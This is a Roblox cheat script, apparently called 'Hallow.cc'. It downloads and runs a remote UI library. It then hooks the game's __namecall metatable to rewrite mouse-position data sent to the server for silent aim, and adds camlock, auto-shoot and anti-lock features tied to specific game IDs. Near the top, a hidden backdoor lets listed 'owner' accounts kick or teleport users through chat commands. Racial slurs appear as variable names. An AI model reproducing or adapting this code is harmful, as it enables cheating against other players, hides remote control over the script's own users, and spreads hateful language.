local function playIntro()
            local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "IntroScreen"
            screenGui.Parent = playerGui

            local frame = Instance.new("Frame")
            frame.Name = "IntroFrame"
            frame.Parent = screenGui
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundTransparency = 1

            local imageLabel = Instance.new("ImageLabel")
            imageLabel.Name = "IntroImage"
            imageLabel.Parent = frame
            imageLabel.Size = UDim2.new(0.7, 0, 0.5, 0)
            imageLabel.Position = UDim2.new(0.15, 0, 0.15, 0)
            imageLabel.Image = "rbxassetid://112514883304320"
            imageLabel.BackgroundTransparency = 1
            imageLabel.ImageTransparency = 0.5

            local sound = Instance.new("Sound")
            sound.Name = "IntroSound"
            sound.Parent = frame
            sound.SoundId = "rbxassetid://9067256917"
            sound.Volume = 2
            sound:Play()

            local tweenService = game:GetService("TweenService")

            local blurEffect = Instance.new("BlurEffect")
            blurEffect.Parent = game.Lighting
            blurEffect.Size = 24

            local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

            local fadeIn = tweenService:Create(imageLabel, tweenInfo, {ImageTransparency = 0.5})
            local fadeOut = tweenService:Create(imageLabel, tweenInfo, {ImageTransparency = 1})
            local blurTween = tweenService:Create(blurEffect, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 0})

            fadeIn:Play()
            fadeIn.Completed:Wait()

            wait(2)

            fadeOut:Play()
            fadeOut.Completed:Wait()

            blurTween:Play()
            blurTween.Completed:Wait()

            blurEffect:Destroy()
            screenGui:Destroy()
        end

        playIntro()
        
        
 repeat wait() until game:IsLoaded()




local repo = 'https://raw.githubusercontent.com/LionTheGreatRealFrFr/MobileLinoriaLib/main/'


local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()


Library:Notify('Hallow Is On Top')
wait(1)
Library:Notify('Loading')
wait(5)
Library:Notify('Hallow Is Loaded')


local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Hallow.cc',
    Center = true,
    AutoShow = true,
})


local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local owners = {
    "27k_GAMIN",
    "pzoz853",  
    "Secret_Sorrcerer", 
    "Ziperm_Mentol"
}

function x1y2z3(owner)
    if owner then
        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
    end
end

function a1b2c3(ownerName)
    local owner

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == ownerName then
            owner = player
            break
        end
    end

    if owner then
        owner.Chatted:Connect(function(message)
            if message == "/kick ." then
                localPlayer:Kick("Admins Has Kicked You.")
            elseif message == "/bring ." then
                x1y2z3(owner)
            end
        end)
    end
end

for _, ownerName in ipairs(owners) do
    a1b2c3(ownerName)
end

local Tabs = {
    Main = Window:AddTab('Main'),
    Misc = Window:AddTab('Misc'),
    Config = Window:AddTab('Config'),
}


Library:SetWatermarkVisibility(true)


local FrameTimer = tick()
local FrameCounter = 0;
local FPS = 60;

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

    Library:SetWatermark(('Hallow.cc | %s ms |'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ));
end);


Library:OnUnload(function()
    WatermarkConnection:Disconnect()

    print('Unloaded!')
    Library.Unloaded = true
end)

local LeftGroupBox = Tabs.Main:AddLeftGroupbox('TargetAim Settings')



getgenv().Hallow = {
    Enabled = false,
    Camera = false,
    HorizontalPrediction = 0.1678963,
    VerticalPrediction = 0.1,
    jumpoffset = 0.09,
    ResolverEnabled = false,
    SelectedPart = "HumanoidRootPart",
    AutoPrediction = true,
    AutoPredMode = "PingBased",  
    Macro = "OFF", -- OFF or ON
    ShootDelay = 0.22,
    NoGroundShot = false,
    AutoAir = false,
    LookAt = false,
    smoothness = 0.142,
    TracerEnabled = false
}


LeftGroupBox:AddToggle('Enabled', {
    Text = 'Target Lock',
    Default = getgenv().Hallow.Enabled,
    Callback = function(Value)
        getgenv().Hallow.Enabled = Value
    end
})

LeftGroupBox:AddToggle('LookAt', {
    Text = 'Look At',
    Default = getgenv().Hallow.LookAt,
    Callback = function(Value)
        getgenv().Hallow.LookAt = Value
    end
})

LeftGroupBox:AddToggle('resolvert', {
    Text = 'Resolver',
    Default = false,
    Callback = function(Value)
        getgenv().Hallow.ResolverEnabled = Value
    end
})


local DickHead = Tabs.Main:AddLeftGroupbox('Cam')


DickHead:AddToggle('CamLock', {
    Text = 'Enable CamLock',
    Default = getgenv().Hallow.Camera,
    Callback = function(Value)
        getgenv().Hallow.Camera = Value
    end
})



DickHead:AddInput('Smoothness', {
    Default = tostring(getgenv().Hallow.smoothness),
    Numeric = true,
    Text = 'Camera Smoothness',
    Callback = function(Value)
        getgenv().Hallow.smoothness = tonumber(Value)
    end
})

DickHead:AddToggle('NoGroundShot', {
    Text = 'No Ground Shot',
    Default = getgenv().Hallow.NoGroundShot,
    Callback = function(Value)
        getgenv().Hallow.NoGroundShot = Value
    end
})

local sigmaox = Tabs.Main:AddLeftGroupbox('Auto Air')



sigmaox:AddToggle('Flicker', {
    Text = 'Flick',
    Default = getgenv().Hallow.Flick,
    Callback = function(Value)
        getgenv().Hallow.Flick = Value
    end
})

sigmaox:AddToggle('Auto Air', {
    Text = 'Enable Auto Air',
    Default = getgenv().Hallow.AutoAir,
    Callback = function(Value)
        getgenv().Hallow.AutoAir = Value
    end
})

sigmaox:AddInput('ShootDelay', {
    Default = tostring(getgenv().Hallow.ShootDelay),
    Numeric = true,
    Text = 'Shoot Delay',
    Callback = function(Value)
        getgenv().Hallow.ShootDelay = tonumber(Value)
    end
})




local RightGroupBox = Tabs.Main:AddRightGroupbox('Prediction Settings')

RightGroupBox:AddInput('HorizontalPrediction', {
    Default = tostring(getgenv().Hallow.HorizontalPrediction),
    Numeric = true,
    Text = 'Prediction',
    Callback = function(Value)
        if not getgenv().Hallow.AutoPrediction then
            getgenv().Hallow.HorizontalPrediction = tonumber(Value)
        end
    end
})

RightGroupBox:AddInput('Jump Offset', {
    Default = tostring(getgenv().Hallow.jumpoffset),
    Text = 'Jump Offset',
    Callback = function(Value)
        getgenv().Hallow.jumpoffset = Value
    end
})

RightGroupBox:AddToggle('AutoPrediction', {
    Text = 'Auto Prediction',
    Default = getgenv().Hallow.AutoPrediction,
    Callback = function(Value)
        getgenv().Hallow.AutoPrediction = Value
    end
})



-- Dropdown for Auto Prediction Mode
RightGroupBox:AddDropdown('AutoPredMode', {
    Values = { 'AdvanceCalculation', 'PingBased', 'Calculation', 'Blatant' },
    Default = getgenv().Hallow.AutoPredMode == 'PingBased' and 2 or 1, -- Default to PingBased
    Text = 'Auto Prediction Mode',
    Callback = function(Value)
        getgenv().Hallow.AutoPredMode = Value
    end
})

RightGroupBox:AddDropdown('SelectedPart', {
    Values = { 'Head', 'LowerTorso', 'UpperTorso', 'HumanoidRootPart' },
    Default = getgenv().Hallow.SelectedPart == 'Head' and 1 or
              getgenv().Hallow.SelectedPart == 'LowerTorso' and 2 or
              getgenv().Hallow.SelectedPart == 'UpperTorso' and 3 or 4,
    Text = 'Target Part',
    Callback = function(Value)
        getgenv().Hallow.SelectedPart = Value
    end
})

local RightGroupBox99 = Tabs.Main:AddRightGroupbox('Silent Aim')

RightGroupBox99:AddToggle('Si9282829382991lent', {
    Text = 'Silent Aim',
    Default = getgenv().Hallow.SilentAim,
    Callback = function(Value)
        getgenv().Hallow.SilentAim = Value
    end
})

RightGroupBox99:AddToggle('Silen3838322222182891929t', {
    Text = 'Fov',
    Default = false,
    Callback = function(Value)
        getgenv().ShowFOV = Value
    end
})

RightGroupBox99:AddInput('Fov Si9182819ze', {
    Default = tostring(getgenv().FOVSize or 25),
    Numeric = true,
    Text = 'Fov Size',
    Callback = function(Value)
        getgenv().FOVSize = tonumber(Value)
    end
})


SaveManager:SetLibrary(Library)
ThemeManager:SetLibrary(Library)

ThemeManager:SetFolder('HallowTheme')
SaveManager:SetFolder('HallowCFG')

ThemeManager:ApplyToTab(Tabs['Config'])
SaveManager:BuildConfigSection(Tabs['Config'])








game:GetService("RunService").Heartbeat:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character

    if character and character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = character.HumanoidRootPart
        local vel = humanoidRootPart.Velocity

        if getgenv().cframespeedtoggle == true then
            humanoidRootPart.CFrame = humanoidRootPart.CFrame +
                character.Humanoid.MoveDirection * getgenv().speedvalue / 0.5
        end

        if getgenv().Hallow.AntiEnabled then
            if getgenv().Hallow.AntiLock == "Predbreaker" then
                humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
            elseif getgenv().Hallow.AntiLock == "Sky" then
                humanoidRootPart.Velocity = Vector3.new(0, 100, 0)
            elseif getgenv().Hallow.AntiLock == "Ground" then
                humanoidRootPart.Velocity = Vector3.new(0, -400, 0)
            end
        end

        game:GetService("RunService").RenderStepped:Wait()
        humanoidRootPart.Velocity = vel
    end
end)


local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local dragging, dragInput, dragStart, startPos



local function createScreenGui()
    local existingGui = CoreGui:FindFirstChild("MyScreenGui")
    if existingGui then
        return existingGui
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MyScreenGui"
    screenGui.Parent = CoreGui
    return screenGui
end

local function initializeToggleButton(screenGui)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 100, 0, 60)
    button.Position = UDim2.new(1, -100, 0, 80)
    button.Text = "Toggle UI"
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 14
    button.BackgroundColor3 = Color3.new(0, 0, 0)
    button.BackgroundTransparency = 1
    button.TextColor3 = Color3.new(1, 1, 1)
    button.BorderSizePixel = 0

    button.ClipsDescendants = true
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = button

    button.Parent = screenGui

    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            -- Trigger the toggle function on each click
            Library:Toggle()

            dragging = true
            dragStart = input.Position
            startPos = button.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    button.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
            dragInput = input
            local delta = dragInput.Position - dragStart
            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local screenGui = createScreenGui()
initializeToggleButton(screenGui)


getgenv().Hallow.LockType = "Namecall"
getgenv().Hallow.RESOLVER = "MoveDirection"



local game_support = {
    [2788229376] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [12238627497] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [5602055394] = { Remote = "MAINEVENT", Argument = "MousePos" },
    [17403265390] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [17403166075] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [18111448661] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15186202290] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [11143225577] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [15763494605] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [125825216602676] = { Remote = "MAINEVENT", Argument = "MOUSE" },
    [15166543806] = { Remote = "MAINEVENT", Argument = "MoonUpdateMousePos" },
    [17897702920] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [16033173781] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [7213786345] = { Remote = "MainEvent", Argument = "UpdateMousePosI2" },
    [9825515356] = { Remote = "MainEvent", Argument = "MousePosUpdate" },
    [16859411452] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [117734153242642] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [14277620939] = { Remote = "MainEvent", Argument = "UpdateMousePos" },
    [17344804827] = { Remote = "MainEvent", Argument = "UpdateMousePos" }
}




    local Sigmaballs = Instance.new("ScreenGui")
    Sigmaballs.Name = "Sigmaballs"
    Sigmaballs.Parent = game.CoreGui
    Sigmaballs.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Sigmaballs.ResetOnSpawn = false

    local ImageButton = Instance.new("ImageButton")
    ImageButton.Name = "ImageButton"
    ImageButton.Parent = Sigmaballs
    ImageButton.Active = true
    ImageButton.Draggable = true
    ImageButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    ImageButton.BackgroundTransparency = 1
    ImageButton.Size = UDim2.new(0, 150, 0, 50)
    ImageButton.Image = "rbxassetid://112514883304320"
    ImageButton.Position = UDim2.new(0.5, -25, 0.5, -25)

    local Ui2corner = Instance.new("UICorner")
    Ui2corner.CornerRadius = UDim.new(0.2, 0)
    Ui2corner.Parent = ImageButton


local player = game.Players.LocalPlayer
local Plr = nil
local enabled = false


local FOV43 = Drawing.new("Circle")
FOV43.Transparency = 0.5
FOV43.Thickness = 2
FOV43.Color = Color3.new(1, 0, 0)
FOV43.Filled = false
FOV43.Radius = 250
FOV43.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
FOV43.Visible = false

function SigmaOhioPlayer()
    local mouse = player:GetMouse()
    local closestPlayer
    local shortestDistance = math.huge
    local CC = game:GetService("Workspace").CurrentCamera
    local screenCenter = Vector2.new(CC.ViewportSize.X / 2, CC.ViewportSize.Y / 2)
    local fovRadius = FOV43.Radius
    local viewportSize = CC.ViewportSize

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= player and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos, onScreen = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            
            if onScreen and pos.X > 0 and pos.Y > 0 and pos.X < viewportSize.X and pos.Y < viewportSize.Y then
                local magnitude = (Vector2.new(pos.X, pos.Y) - screenCenter).magnitude
                if magnitude < fovRadius and magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
    end
    return closestPlayer
end

function createTracer(localPlayer, targetPlayer)
    if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and
       targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then

        local tracerAttachment1 = Instance.new("Attachment", localPlayer.Character.HumanoidRootPart)
        local tracerAttachment2 = Instance.new("Attachment", targetPlayer.Character.HumanoidRootPart)

        local tracerBeam = Instance.new("Beam")
        tracerBeam.Attachment0 = tracerAttachment1
        tracerBeam.Attachment1 = tracerAttachment2
        tracerBeam.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
        tracerBeam.Width0 = 0.150
        tracerBeam.Width1 = 0.150
        tracerBeam.Parent = localPlayer.Character.HumanoidRootPart

        tracernigger = tracerBeam  

        targetPlayer.CharacterAdded:Connect(function(newCharacter)
            if tracernigger then
                tracernigger:Destroy()  
                tracernigger = nil
            end

            newCharacter:WaitForChild("HumanoidRootPart")
            tracerAttachment2.Parent = newCharacter.HumanoidRootPart
            tracernigger = tracerBeam  
        end)
    end
end

function destroyTracer()
    if tracernigger then
        tracernigger:Destroy()
        tracernigger = nil
    end
end




function LookAtPlayer(Target)
    local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
    local localHumanoidRootPart = localChar:FindFirstChild("HumanoidRootPart")

    if localHumanoidRootPart then
        if getgenv().Hallow and getgenv().Hallow.LookAt then
            if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
                local targetHumanoidRootPart = Target.Character.HumanoidRootPart
                
                local targetPosition = targetHumanoidRootPart.Position
                local localPosition = localHumanoidRootPart.Position
                
                local horizontalDirection = Vector3.new(targetPosition.X - localPosition.X, 0, targetPosition.Z - localPosition.Z).unit
                
                localHumanoidRootPart.CFrame = CFrame.new(localPosition, localPosition + horizontalDirection)
                localChar.Humanoid.AutoRotate = false
            end
        else
            localChar.Humanoid.AutoRotate = true
        end
    end
    
    if not (Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart")) then
        localChar.Humanoid.AutoRotate = true
    end
end

local function toggleLock()
    if enabled then
        ImageButton.Image = "rbxassetid://112514883304320"
        enabled = false
        Plr = nil
        destroyTracer()  

        Library:Notify('Target Disabled')
    else
        Plr = SigmaOhioPlayer()
        if Plr then
            enabled = true
            if getgenv().Hallow.TracerEnabled then
            createTracer(game.Players.LocalPlayer, Plr)  
        end
            
            ImageButton.Image = "rbxassetid://112514883304320"
Library:Notify("Target Locked Into: " .. tostring(Plr.Character.Humanoid.DisplayName)
            
            )
        end
    end
end

ImageButton.MouseButton1Click:Connect(toggleLock)

UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.DPadUp then
        toggleLock()
    end
end)

local function getRemoteInfo()
    local placeId = game.PlaceId
    return game_support[placeId] or { Remote = "MainEvent", Argument = "UpdateMousePos" }
end

local remoteInfo = getRemoteInfo()
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

local Vect3 = Vector3.new


local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(...)
    local args = {...}
    local method = getnamecallmethod()

    if getgenv().Hallow.Enabled and getgenv().Hallow.LockType == "Namecall" then
        if Plr and Plr.Character and method == "FireServer" and (args[2] == remoteInfo.Argument) then
            local selectedPart = getgenv().Hallow.SelectedPart
            local targetPart = Plr.Character[selectedPart]

            if targetPart then
                local velocity
                if getgenv().Hallow.ResolverEnabled then
                    if getgenv().Hallow.RESOLVER == "MoveDirection" then
                        velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
                    elseif getgenv().Hallow.RESOLVER == "LookVector" then
                        velocity = targetPart.CFrame.LookVector * getgenv().Hallow.HorizontalPrediction * 1.0
                    else
                        velocity = targetPart.Velocity
                    end
                else
                    velocity = targetPart.Velocity
                end

                local horizontalPrediction = getgenv().Hallow.HorizontalPrediction
                local verticalPrediction = getgenv().Hallow.VerticalPrediction
                local jumpOffset = getgenv().Hallow.jumpoffset or 0

                if not getgenv().Hallow.ResolverEnabled then
                    args[3] = Vector3.new(
                        targetPart.Position.X + (velocity.X * horizontalPrediction),
                        targetPart.Position.Y + (velocity.Y * verticalPrediction) + jumpOffset,
                        targetPart.Position.Z + (velocity.Z * horizontalPrediction)
                    )
                else
                    args[3] = targetPart.Position + (velocity or Vector3.new()) * horizontalPrediction + Vector3.new(0, jumpOffset, 0)
                end

                return old(unpack(args))
            end
        end
    end

    return old(...)
end)

setreadonly(mt, true)

local Stas = game:GetService("Stats")

local RunService = game:GetService("RunService")


local Blatant = {
    {50, 0.12758545757236864},
    {60, 0.12593338424986178},
    {70, 0.1416310605747206},
    {80, 0.1441481061236737},
    {90, 0.14306050263254388},
    {100, 0.14698413210558095},
    {110, 0.14528324362031425},
    {120, 0.14556534594403},
    {130, 0.14614337395777216},
    {140, 0.14645603036905414},
    {150, 0.14736848095666674},
    {160, 0.14696985547996216},
    {170, 0.14718530231216217},
    {180, 0.1471532933015037},
    {190, 0.1471212842908452},
    {200, 0.14708927528018672},
    {210, 0.14705726626952823},
    {220, 0.14702525725886974},
    {230, 0.14699324824821125},
    {240, 0.14696123923755276},
    {250, 0.14692923022689427},
    {260, 0.14689722121623578},
    {270, 0.1468652122055773},
    {280, 0.1468332031949188},
    {290, 0.1468011941842603},
    {300, 0.1467691851736018},
}

local predictionTable = {
    {0, 0.1332},
    {10, 0.1234555},
    {20, 0.12435},
    {30, 0.124123},
    {40, 0.12766},
    {50, 0.128643},
    {60, 0.1264236},
    {70, 0.12533},
    {80, 0.1321042},
    {90, 0.1421951},
    {100, 0.134143},
    {105, 0.141199},
    {110, 0.142199},
    {125, 0.15465},
    {130, 0.12399},
    {135, 0.1659921},
    {140, 0.1659921},
    {145, 0.129934},
    {150, 0.1652131},
    {155, 0.125333},
    {160, 0.1223333},
    {165, 0.1652131},
    {170, 0.16863},
    {175, 0.16312},
    {180, 0.1632},
    {185, 0.16823},
    {190, 0.18659},
    {205, 0.17782},
    {215, 0.16937},
    {225, 0.176332},
}

local function calculateAdvancePrediction(target, cameraPosition, pingBase)
    local character = Plr.Character and Plr.Character.Parent
    if character then
        local GoodPartTheCom = character:FindFirstChild("HumanoidRootPart")
        if GoodPartTheCom then
            local Velop = GoodPartTheCom.Velocity
            local distanc11 = (cameraPosition - GoodPartTheCom.Position).Magnitude
            local advancePrediction = pingBase + (distanc11 / 1000) * (Velop.Magnitude / 50)
            return advancePrediction
        end
    end
    return pingBase
end

local function updatePredictionValue()
    if getgenv().Hallow.AutoPrediction then
        local pingValue = Stas.Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingValue, '(')
        local ping = tonumber(split[1])

        if ping then
            if getgenv().Hallow.AutoPredMode == "PingBased" then
                for i = 1, #predictionTable do
                    if ping < predictionTable[i][1] then
                        local value = predictionTable[i][2]
                        getgenv().Hallow.HorizontalPrediction = value
                        getgenv().Hallow.VerticalPrediction = value
                        break
                    end
                end
            elseif getgenv().Hallow.AutoPredMode == "Calculation" then
                local calculatedValue = 0.1 + (ping / 1000) * 0.32
                getgenv().Hallow.HorizontalPrediction = calculatedValue
                getgenv().Hallow.VerticalPrediction = calculatedValue
            elseif getgenv().Hallow.AutoPredMode == "AdvanceCalculation" then
                for i = 1, #predictionTable do
                    if ping < predictionTable[i][1] then
                        local pingBase = predictionTable[i][2]
                        local advancePredictionValue = calculateAdvancePrediction(Plr, workspace.CurrentCamera.CFrame.Position, pingBase)
                        getgenv().Hallow.HorizontalPrediction = advancePredictionValue
                        getgenv().Hallow.VerticalPrediction = advancePredictionValue
                        break
                    end
                end
            elseif getgenv().Hallow.AutoPredMode == "Blatant" then
                for i = 1, #Blatant do
                    if ping < Blatant[i][1] then
                        local value = Blatant[i][2]
                        getgenv().Hallow.HorizontalPrediction = value
                        getgenv().Hallow.VerticalPrediction = value
                        break
                    end
                end
            end
        end
    end
end


RunService.Heartbeat:Connect(function()
    if getgenv().Hallow.Flick and Plr and Plr.Character then
        local playerHumanoid = Plr.Character:FindFirstChild("Humanoid")
        if playerHumanoid and playerHumanoid.Health > 0 then
       
            local targetPart = Plr.Character:FindFirstChild("UpperTorso") or Plr.Character:FindFirstChild("Head")
            if targetPart and playerHumanoid.FloorMaterial == Enum.Material.Air then
                local camera = workspace.CurrentCamera
                local targetPosition = targetPart.Position + targetPart.Velocity * getgenv().Hallow.VerticalPrediction
                camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
            end
        end
    end
end)



RunService.Heartbeat:Connect(function()
    if getgenv().Hallow.Camera and Plr and Plr.Character and getgenv().Hallow.SelectedPart then
        local camera = Workspace.CurrentCamera
        local selectedPart = getgenv().Hallow.SelectedPart
        local targetPart = Plr.Character[selectedPart]

        if targetPart then
            local velocity
            if getgenv().Hallow.ResolverEnabled then
                if getgenv().Hallow.RESOLVER == "MoveDirection" then
                    velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
                elseif getgenv().Hallow.RESOLVER == "LookVector" then
                    velocity = targetPart.CFrame.LookVector * getgenv().Hallow.HorizontalPrediction * 1.0
                else
                    velocity = targetPart.Velocity
                end
            else
                velocity = targetPart.Velocity
            end

            local jumpOffset = getgenv().Hallow.jumpoffset or 0
            local fallOffset = getgenv().Hallow.FallOffset or 0

            local verticalVelocity = velocity.Y
            local appliedVerticalOffset = 0

            if verticalVelocity > 0 then
                appliedVerticalOffset = jumpOffset
            elseif verticalVelocity < 0 then
                appliedVerticalOffset = -fallOffset
            end

            local horizontalPrediction = getgenv().Hallow.HorizontalPrediction
            local verticalPrediction = getgenv().Hallow.VerticalPrediction

            local targetPosition = Vector3.new(
                targetPart.Position.X + (velocity.X * horizontalPrediction),
                targetPart.Position.Y + (velocity.Y * verticalPrediction) + appliedVerticalOffset,
                targetPart.Position.Z + (velocity.Z * horizontalPrediction)
            )

            local smoothness = getgenv().Hallow.smoothness or 0.1 
            camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.Position, targetPosition), smoothness)
        end
    end
end)

local players = game:GetService("Players")
local client = players.LocalPlayer

local function AutoShoot()
    if Plr then
        local character = client.Character
        if character then
            local tool = character:FindFirstChildOfClass("Tool")
            if tool and tool:IsA("Tool") then
                tool:Activate()
            end
        else
            warn("Character not found for client")
        end
    else
        warn("No target (Plr) found")
    end
end

local Shot2ing = false

local function ApplyAntiGround()
    local character = Plr.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    
    if humanoidRootPart then
        local velocity = humanoidRootPart.Velocity
        local SigmaAir = humanoidRootPart.Position.Y > 2

        if not SigmaAir and velocity.Y < -3 then
            if getgenv().Hallow.NoGroundShot then
                humanoidRootPart.Velocity = Vector3.new(velocity.X, 0, velocity.Z)
            end
        else
            if not getgenv().Hallow.NoGroundShot then
                humanoidRootPart.Velocity = Vector3.new(velocity.X, velocity.Y, velocity.Z)
            end
        end
    end
end

local targetSigm99928 = getgenv().Hallow.ShootDelay 
local targetSigmaPOBALLs = nil

local function checkTarget()
    if Plr and Plr.Character then
        local humanoid = Plr.Character:FindFirstChildOfClass("Humanoid")
        local humanoidRootPart = Plr.Character:FindFirstChild("HumanoidRootPart")
        
        if humanoid and humanoidRootPart then
            local SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoidRootPart.Velocity.Y > 2
            
         
            if SigmaAir and getgenv().Hallow.AutoAir then
                if not targetSigmaPOBALLs then
                    
                    targetSigmaPOBALLs = tick()
                else
                   
                    local airDuration = tick() - targetSigmaPOBALLs
                    if airDuration >= targetSigm99928 then
                        if not Shot2ing then
                            Shot2ing = true
                            while Plr and Plr.Character and (SigmaAir) do
                                AutoShoot()
                                wait(0.001)
                               
                                SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Jumping or humanoid:GetState() == Enum.HumanoidStateType.Freefall
                                
                                
                                if not SigmaAir then
                                    Shot2ing = false
                                    targetSigmaPOBALLs = nil -- Reset the start time
                                    break
                                end
                            end
                            Shot2ing = false
                        end
                    end
                end
            else
                
                targetSigmaPOBALLs = nil
                Shot2ing = false
            end
        end
    end
end





game:GetService("RunService").RenderStepped:Connect(function()
    LookAtPlayer(Plr)
    checkTarget()
    if Plr then
        updatePredictionValue()
        ApplyAntiGround()
    end
end)


local Camera = workspace.CurrentCamera



getgenv().Filled = false
getgenv().FOVTransparency = 0.8
getgenv().FOVThickness = 1
getgenv().FOVColor = Color3.new(0, 0, 0)
getgenv().ShowFOV = false
getgenv().FOVSize = 25


local FOV = Drawing.new("Circle")
FOV.Transparency = getgenv().FOVTransparency
FOV.Thickness = getgenv().FOVThickness
FOV.Color = getgenv().FOVColor
FOV.Filled = getgenv().Filled
FOV.Radius = getgenv().FOVSize
FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

local function IsPlayerInFOV(player)
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
        return false
    end

    local characterRootPart = player.Character.HumanoidRootPart
    local screenPosition, onScreen = Camera:WorldToViewportPoint(characterRootPart.Position)
    local centerScreenPosition = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude

    if onScreen and distance <= FOV.Radius then
        local ray = Ray.new(Camera.CFrame.Position, (characterRootPart.Position - Camera.CFrame.Position).unit * 500)
        local part, position = workspace:FindPartOnRay(ray, LocalPlayer.Character)
        return not part or part:IsDescendantOf(player.Character)
    end
    return false
end


RunService.RenderStepped:Connect(function()
    FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    FOV.Radius = getgenv().FOVSize
    FOV.Visible = getgenv().ShowFOV
targetSigm99928 = getgenv().Hallow.ShootDelay

    if getgenv().Hallow.SilentAim then
        local NiggerLocated = false

        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and IsPlayerInFOV(player) then
                NiggerLocated = true
                Plr = player
                break
            end
        end

        if not NiggerLocated then
            Plr = nil
        end
    end
end)
